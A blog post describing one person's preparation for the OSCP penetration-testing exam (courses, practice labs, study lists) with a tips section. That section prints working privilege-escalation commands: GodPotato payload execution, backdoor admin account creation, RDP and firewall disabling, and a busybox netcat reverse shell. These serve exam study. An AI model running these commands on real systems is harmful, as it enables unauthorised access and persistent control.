---
title: How I Passed the OSCP
date: 2024-09-18T18:38:38.550Z
lastmod: 2024-09-19T05:26:36.691Z
---
I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.

Now, let’s spill the beans! How did I score 90 on my first attempt? There must be a secret, right?

![How I Passed the OSCP.gif](/postimgs/Images/How%20I%20Passed%20the%20OSCP.gif)

Keep in mind, even though the exam format for OSCP+ has changed, the core modules and topics remain the same. The tips I share here apply for both OSCP and OSCP+.

# Steps I Took Before Buying the Course

These were the preparation steps I took before even buying the course and I did these from March to May (3 months).

## TCM Security

I first completed the [Practical Ethical Hacking](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) course by TCM, which gave me a solid understanding of what I needed to learn and the breadth of topics I had to cover.

The course introduced me to the **enumeration** methodology I would need to develop and provided a detailed overview of Active Directory. It included setting up a lab with one Domain Controller running Windows Server and two workstations running standard Windows.

Setting up the lab was a unique experience that gave me insights into the inner workings of Active Directory. After the lab was operational, the course covered network attack techniques, and I was introduced to [Hack The Box](https://www.hackthebox.com/hacker), where I learned to hack other AD networks.

This is where I learned various AD attack techniques such as Pass-the-Hash, Pass-the-Ticket, Kerberoasting, AS-REP Roasting, and Silver Ticket Attacks.

Towards the end of the course, Windows and Linux Privilege Escalation was covered, though not comprehensively. The Web Attacks section was also moderately thorough.

## Hack The Box

After TCM Security's course I started with the HTB machine on [TJNull's list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#) . The machines that helped me the most for AD were **Absolute**, **Cerberus** , **Forest** , **Return**.\
These were harder than the OSCP but it was good material.

I would recommend the better list now which is the [LainKusanagi's list](https://docs.google.com/spreadsheets/u/0/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/htmlview?pli=1), which removed a few machines from TJNull's list and added more good practice machines to align closer with the OSCP exam.

## CPTS Path

This was the most comprehensive material I ever covered for the OSCP and most of my notes for the OSCP are from doing the CPTS Path from HTB Academy. Make an account at HTB Academy and head [here](https://academy.hackthebox.com/paths/jobrole). Now choose the penetration tester Job Role path.

I used the student subscription which allowed access to the whole path. Do skip the SQLMap and Metasploit sections if OSCP is your only goal.

## Vulnlab

This was the most valuable practice I did for AD and Linux and Windows Privilege Escalation. I learnt a lot of new enumeration techniques and one of them directly helped me on the exam.

I would recommend to do this list of [recommendations](https://wiki.vulnlab.com/intro/recommendations) from vulnlab wiki.

# Buying the course

Ok I'll admit, shelling out \$2,599 for the Learn One subscription was a bit terrifying and the stakes were never higher. I opted the one year subscription and started it from May 24th.

I will not be going into much detail about the course but I will share how much I am allowed to

## Course Material

The course material was underwhelming and was nowhere close to the thoroughness of the CPTS Path. I did learn new techniques like different Client Side attacks. I was done with the course material along with labs in around 20 days

## Challenge Labs

I did all the challenge labs except Skylark which I had completed 50% of. Medtech, Relia and Skylark are big networks with 10-20 machines. The machines were interconnected and clues from one machine could be crucial to gain control of the next machine.

OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalones. I found them much easier than the actual exam.

# Tips & Tricks

## Windows Privilege Escalation

So listen closely as you will not find this information **anywhere**.

Sometimes you will have SeImpersonatePrivilege and when you use your usual potato attacks like Juicy Potato or PrintSpooler IT WILL FAIL. This is where [Godpotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) comes in which has worked for me always.\
I use msfvenom to create a payload and execute as nt authority

```powershell
GodPotato -cmd "C:\Users\Public\reverse.exe"
```

Now that's not it.

Sometimes the SeImpersonatePrivilege is not the actual intended path so the Godpotato shell will be broken and you will not be able to execute whoami, no output for mimikatz, etc.

Now the trick is to add an Administratror user using Godpotato.

```
GodPotato -cmd "net user /add backdoor Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"
```

Now to get a shell use RunasCs.exe

```
RunasCs.exe backdoor Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8
```

This will give us a proper shell.

We can also open the RDP port and login using RDP. Run this as Administrator:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

netsh advfirewall set allprofiles state off

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Now you RDP using backdoor user.

This can also be done using netexec:

```
nxc smb <ip> -u backdoor -p Password123 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

One liner to add a user and enable rdp:

```
net user hacker Hacker123456@ /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
```

## Linux Privilege Escalation

For Linux privilege escalation I use the usual linpeas with [pspy](https://github.com/DominicBreuker/pspy).

Pspy can check for programs or scripts that are running at regular intervals.

![How I Passed the OSCP.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP.png)\
In this example we could check if we have write access on the script or if the script uses something like tar with `*` which could open up possibilities of the wildcard privesc path.

## Reverse Shells

For reverse shells use [revshell.com](https://www.revshells.com/) for both windows and Linux

For Linux reverse shells try using busybox first as I found that to be the most reliable:

```bash
busybox nc <ip> <port> -e sh
```

And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
Once a reverse shell is connected you can start a listener again and connect to the same port once again.
